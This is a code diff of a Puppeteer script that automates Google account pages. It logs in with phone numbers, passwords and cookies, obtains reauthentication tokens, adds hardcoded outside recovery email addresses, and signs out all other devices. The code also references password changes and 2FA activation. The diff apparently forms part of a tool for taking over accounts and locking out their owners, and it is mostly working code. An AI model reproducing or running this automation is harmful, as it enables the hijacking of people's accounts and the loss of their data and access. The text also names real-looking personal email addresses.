@@ -319,7 +319,10 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
 
                         let mNumberYear = await waitForNumberYear(page)
 
+                        let mDeviceYear = await waitForDeviceLogout(page, mRapt)
+
                         mYear = (mNumberYear < mYear) ? mNumberYear : mYear
+                        mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
                         
                         console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
 
@@ -327,7 +330,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
 
                         if (rapt) mRapt = rapt
                         
-                        let mRecovery = await waitForRecoveryAdd(page, number, password, mRapt, ['r.v.y.david121@gmail.com', 'arafatfilee@gmail.com'])
+                        let mRecovery = await waitForRecoveryAdd(page, mRapt, ['r.v.y.david121@gmail.com', 'arafatfilee@gmail.com'])
         
                         console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
                         
@@ -533,14 +536,10 @@ async function waitForPasswordChange(page, mRapt) {
     return null
 }
 
-async function waitForRecoveryAdd(page, number, password, mRapt, mRecovery) {
+async function waitForRecoveryAdd(page, mRapt, mRecovery) {
     try {
         await page.goto('https://myaccount.google.com/recovery/email?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
         await delay(1000)
-
-        let newmRapt = await waitForLoginChallenge(page, number, password, 'https://myaccount.google.com/recovery/email')
-
-        if (newmRapt) await delay(500)
 
         let recovery
 
@@ -641,80 +640,69 @@ async function waitForFindView(page, tagName, matchText, timeout = 30) {
     return null
 }
 
-async function waitForDeviceLogout(page, mRapt, number, password, size) {
-    let newmRapt = null
+async function waitForDeviceLogout(page, mRapt) {
+    try {
+        await page.goto('https://myaccount.google.com/device-activity?hl=en&rapt='+mRapt)
+        await delay(1000)
 
-    for (let i = 0; i < size; i++) {
-        try {
-            await page.goto('https://myaccount.google.com/device-activity?hl=en&rapt='+mRapt)
-            await delay(1000)
+        let mDevice = await page.evaluate(() => {
+            let list = document.querySelectorAll('script')
+            let year = parseInt(new Date().getFullYear())
+            let logout = []
+            let years = []
+            let data = []
 
-            newmRapt = await waitForLoginChallenge(page, number, password, 'https://myaccount.google.com/device-activity')
+            for (let i = 0; i < list.length; i++) {
+                let html = list[i].innerHTML
+                if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
+                    data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
+                    break
+                }
+            }
 
-            if (newmRapt) {
+            for(let i=0; i<data.length; i++) {
+                let child = data[i][2]
+                for(let j=0; j<child.length; j++) {
+                    let main = child[j]
+                    if(main.length > 9 && main[9]) {
+                        years.push(main[9])
+                    }
+                    if(main.length > 23) {
+                        if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
+                            logout.push(main[0])
+                        }
+                    }
+                }
+            }
+
+            years.sort(function(a, b){return a-b})
+
+            if(years.length > 0) {
+                year = parseInt(new Date(years[0]).getFullYear())
+            }
+
+            if (year < 2000) parseInt(new Date().getFullYear())
+
+            return { list:logout, year:year }
+        })
+
+        console.log('Process: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
+
+        for (let i = 0; i < mDevice.list.length; i++) {
+            try {
+                await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i]+'?hl=en&rapt='+mRapt)
                 await delay(500)
-                mRapt = newmRapt
-            }
-    
-            let mDevice = await page.evaluate(() => {
-                let list = document.querySelectorAll('script')
-                let year = parseInt(new Date().getFullYear())
-                let logout = []
-                let years = []
-                let data = []
-    
-                for (let i = 0; i < list.length; i++) {
-                    let html = list[i].innerHTML
-                    if (html.startsWith('AF_initDataCallback') && !html.includes('mail.google.com') && !html.includes('meet.google.com')) {
-                        data = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))[1]
-                        break
-                    }
-                }
-    
-                for(let i=0; i<data.length; i++) {
-                    let child = data[i][2]
-                    for(let j=0; j<child.length; j++) {
-                        let main = child[j]
-                        if(main.length > 9 && main[9]) {
-                            years.push(main[9])
-                        }
-                        if(main.length > 23) {
-                            if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
-                                logout.push(main[0])
-                            }
-                        }
-                    }
-                }
-    
-                years.sort(function(a, b){return a-b})
-    
-                if(years.length > 0) {
-                    year = parseInt(new Date(years[0]).getFullYear())
-                }
-    
-                if (year < 2000) parseInt(new Date().getFullYear())
-    
-                return { list:logout, year:year }
-            })
-    
-            console.log('Process: [ Login Devices: '+mDevice.list.length+' --- Time: '+getTime()+' ]')
-    
-            for (let i = 0; i < mDevice.list.length; i++) {
-                try {
-                    await page.goto('https://myaccount.google.com/device-activity/id/'+mDevice.list[i]+'?hl=en&rapt='+mRapt)
-                    await delay(500)
-                    await page.click('button[class="Rju2Ue-jPmIDe Rju2Ue-jPmIDe-OWXEXe-ssJRIf Rju2Ue-jPmIDe-OWXEXe-ssJRIf-hXIJHe"]')
-                    await delay(1000)
-                    await page.click('div[class="KsHAYd J9fJmf"] > button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
-                    await delay(2000)
-                } catch (error) {}
-            }
-    
-            return {rapt: newmRapt, year: mDevice.year }
-        } catch (error) {}
-    }
+                await page.click('button[class="Rju2Ue-jPmIDe Rju2Ue-jPmIDe-OWXEXe-ssJRIf Rju2Ue-jPmIDe-OWXEXe-ssJRIf-hXIJHe"]')
+                await delay(1000)
+                await page.click('div[class="KsHAYd J9fJmf"] > button[class="VfPpkd-LgbsSe ksBjEc lKxP2d LQeN7 SdOXCb LjrPGf HvOprf evJWRb"]')
+                await delay(2000)
+            } catch (error) {}
+        }
 
-    return {rapt: newmRapt, year: parseInt(new Date().getFullYear()) }
+        return mDevice.year
+    } catch (error) {}
+
+    return parseInt(new Date().getFullYear())
 }
 
 async function waitForLanguageChange(page) {
@@ -1078,40 +1066,6 @@ async function waitForRaptToken(page, number, password) {
     } catch (error) {}
 
     return { token:mRapt, password:mPassword }
-}
-
-async function waitForLoginChallenge(page, number, password, target) {
-    try {
-        let url = await page.url()
-
-        if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
-            console.log('Process: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
-            await waitForSelector(page, 'input[type="password"]')
-            await delay(500)
-            await page.type('input[type="password"]', password)
-            await delay(500)
-            await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
-
-            for (let i = 0; i < 20; i++) {
-                try {
-                    url = await page.url()
-
-                    if (url.startsWith(target)) {
-                        return await getRapt(url)
-                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect') || url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') || url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
-                        break
-                    }
-                } catch (error) {}
-
-                await delay(500)
-            }
-
-        }
-    } catch (error) {
-        console.log(error)
-    }
-
-    return null
 }
 
 async function waitForTwoFaActive(page, mRapt) {
